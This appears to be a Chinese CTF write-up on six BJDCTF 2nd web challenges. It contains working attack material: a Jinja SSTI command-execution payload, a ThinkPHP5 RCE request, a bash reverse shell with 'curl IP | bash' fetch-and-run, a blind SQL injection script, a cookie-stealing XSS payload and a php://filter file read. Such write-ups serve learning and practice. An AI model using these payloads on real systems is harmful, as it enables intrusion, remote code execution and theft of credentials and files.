---
title: '[BJDCTF 2nd] Web'
tags: Web
---

# BJDCTF 2nd-Web

这次一道都没做出来唉 倒是做出不少密码学和杂项 要好好反思自己 认真学习Web的知识点了 题目刷的还是太少了

## fake Google

​	打开是一个谷歌的界面 点击搜索按钮没有反应 随便输入一个内容 跳转到./qaq 界面 在源码里发现是ssti 自然要通过搜索框内的文字进行注入![1585037012851](C:\Users\honor\AppData\Roaming\Typora\typora-user-images\1585037012851.png)

![1585037154286](C:\Users\honor\AppData\Roaming\Typora\typora-user-images\1585037154286.png)

可以确定存在ssti注入了

![1585037178988](C:\Users\honor\AppData\Roaming\Typora\typora-user-images\1585037178988.png)

```html
{{config.__class__.__init__.__globals__['os'].popen('cat /flag | base64').read() }}
```

手动注入 ![1585041970264](C:\Users\honor\AppData\Roaming\Typora\typora-user-images\1585041970264.png)

base64解码得到flag

也可以使用 tplmap 扫描

![](C:\Users\honor\AppData\Roaming\Typora\typora-user-images\1585038295676.png)

![1585038306756](C:\Users\honor\AppData\Roaming\Typora\typora-user-images\1585038306756.png)

## old-hack

![1585045309368](C:\Users\honor\AppData\Roaming\Typora\typora-user-images\1585045309368.png)

thinkphp5？

![1585045358998](C:\Users\honor\AppData\Roaming\Typora\typora-user-images\1585045358998.png)

查了下资料 think 中的s参数可以加载模块

![1585045782862](C:\Users\honor\AppData\Roaming\Typora\typora-user-images\1585045782862.png)

<img src="C:\Users\honor\AppData\Roaming\Typora\typora-user-images\1585045800897.png" alt="1585045800897" style="zoom:50%;" />

![1585055081949](C:\Users\honor\AppData\Roaming\Typora\typora-user-images\1585055081949.png)



直接上php5以上的payload

```php
(post)public/index.php (data)_method=__construct&filter[]=system&server[REQUEST_METHOD]=touch%20/tmp/xxx
```

![1585115934246](C:\Users\honor\AppData\Roaming\Typora\typora-user-images\1585115934246.png)

参考链接：

https://www.ebounce.cn/web/thinkphp-rce.html

https://www.gem-love.com/ctf/2097.html#i-5

## duangShell

![1585121253215](C:\Users\honor\AppData\Roaming\Typora\typora-user-images\1585121253215.png)

swp泄密  访问/.index.php.swp得到源码 

![1585121523638](C:\Users\honor\AppData\Roaming\Typora\typora-user-images\1585121523638.png)

![1585121703133](C:\Users\honor\AppData\Roaming\Typora\typora-user-images\1585121703133.png)

![1585122177156](C:\Users\honor\AppData\Roaming\Typora\typora-user-images\1585122177156.png)

输入`shell`是不大可能了 只能弹shell

 `exec()`和`system()`不同，`exec()`无回显，所以首选反弹shell，正好curl没ban 

使用 vim -r index.php.swp 恢复一下文件发现在

![1585122873671](C:\Users\honor\AppData\Roaming\Typora\typora-user-images\1585122873671.png)

使用代码审计

在buuctf basic 启动linux labs 开启apache

 `/etc/init.d/apache2 start` 

在apache根目录写一个反弹shell命名为bl.txt

```
bash -i >& /dev/tcp/内网攻击机的ip/2333 0>&1
```

```
nc -lvp 2333
```

再在靶机post传参

`girl_friend=curl IP:xxxx | bash`

参考链接：

https://www.cnblogs.com/leixiao-/p/9786320.html

https://github.com/BjdsecCA/BJDCTF2020_March

https://www.gem-love.com/ctf/2097.html#i-5

https://blog.csdn.net/woshisz0413/article/details/84560421

## 简单注入

看了wp

先fuzz

可以发现：

- 单引号 双引号都被ban了
- union和select都被ban了
- =和like被ban了

 过滤了引号没过滤`\`，post`username=\&password=||1#`发现回显不一样了，布尔盲注 

虽然知道是布尔注入但是不知道登录密码

```python
################################
# 颖奇L'Amore www.gem-love.com #
# 转载请勿删除本水印             #
################################
import os
import requests as req

def ord2hex(string):
  result = ''
  for i in string:
    result += hex(ord(i))
  result = result.replace('0x','')
  return '0x'+result


url = "http://123.57.144.205:2333/"
string = [ord(i) for i in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789']
headers = {
      'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
      'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Connection':'keep-alive'
    }

res = ''
for i in range(50):
  for j in string:
    passwd = ord2hex('^'+res+chr(j))
    # print(passwd)
    passwd = 'or password regexp binary {}#'.format(passwd)
    data = {
      'username':"admin\\",
      'password':passwd
    }

    r = req.post(url, data=data, headers=headers)
    # print(r.text)
    if "BJD need" in r.text:
      res += chr(j)
      print(res)
      break
```

参考：https://www.gem-love.com/ctf/2097.html#GirlfriendInjection

## 假猪套天下第一

bp抓包 发现![1585142895545](C:\Users\honor\AppData\Roaming\Typora\typora-user-images\1585142895545.png)

访问 L0g1n.php

```
Sorry, this site will be available after totally 99 years! 
```

发现cookie里面有个time 的参数 改成99年以后

得到

`Sorry, this site is only optimized for those who comes from localhost`

XFF改成127.0.0.1

无效；看过wp原来是挖的坑  使用Client-IP或者X-Real-IP代替XFF即可。 

`        Sorry, this site is only optimized for those who come from gem-love.com`      

Referer:gem-love.com  

` Sorry, this site is only optimized for browsers that run on Commodo 64` 

User-Agent: Commodo 64

`no no no i think it is not the real commmodo 64, <br>what is the real ua for Commdo?`

太坑了 Commodo 64是种老式系统

或者如果去搜索UA，可以搜到Commodore的UA：

```
Contiki/1.0 (Commodore 64; http://dunkels.com/adam/contiki/)
```

commodore 64也可以

`   Sorry, this site is only optimized for those whose email is root@gem-love.com`

From:root@gem-love.com

`Sorry, this site is only optimized for those who use the http proxy of y1ng.vip<br> if you dont have the proxy, pls contact us to buy, ￥100/Month`

Via:y1ng.vip

  Sorry, even you are good at http header, you're still not my admin.<br> Althoungh u found me, u still dont know where is flag <!--ZmxhZ3thYmI4OWNlZi0zMzMyLTRiMDUtYjk1Yi1lOTA5NjY5NjFlNWJ9Cg==-->

发现flag

## XSS之光

没有头绪看wp

git源码泄露 使用githack 得到

```php
<?php
$a = $_GET['yds_is_so_beautiful'];
echo unserialize($a);
```

不太懂 上师傅的脚本

```php
<?php
$a = serialize(new Exception("<script>window.location.href='xxxx'+document.cookie</script>"))
echo $a;

```

参考：https://www.ctfwp.com/官方赛事题/2020第二届BJDCTF

## 文件探测

```html
<!-- Inheriting and carrying forward the traditional culture of the first BJDCTF, I left a hint in some place that you may neglect  -->
<!-- If you have no idea about the culture of the 1st BJDCTF, you may go to check out the 1st BJDCTF's wirteup that can be found in my blog -->
```

![1585382206792](C:\Users\honor\AppData\Roaming\Typora\typora-user-images\1585382206792.png)

藏在头里

![1585382240585](C:\Users\honor\AppData\Roaming\Typora\typora-user-images\1585382240585.png)

然后接下来不知道怎么做了 看wp

 `这应该很敏感的考虑到文件包含。如果引用别的就会被拼接上.fxxkyou（GXYCTF BabySQLi v3.0的套路）  于是乎，用伪协议读一下system.php的源码：` 

```
http://file-detect.bjdctf.y1ng.vip:12301/home.php?file=php://filter/convert.base64-encode/resource=system
```

参考：https://www.gem-love.com/ctf/2097.html#File_Detect